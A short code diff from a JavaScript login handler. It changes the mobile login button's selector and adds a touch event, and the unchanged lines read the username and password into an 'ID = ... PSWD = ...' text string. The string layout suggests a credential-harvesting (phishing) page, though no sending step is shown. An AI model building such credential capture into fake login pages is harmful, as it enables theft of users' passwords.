@@ -5,7 +5,7 @@ function initialize() {
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
   }
 
-  $('mobloginbuttondiv.mobileloginbutton').on('click', function () {
+  $('.mobileloginbutton').on('click touchstart', function () {
     let username = document.getElementById("mobusername").value;
     let password = document.getElementById("mobuserpassword").value;
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
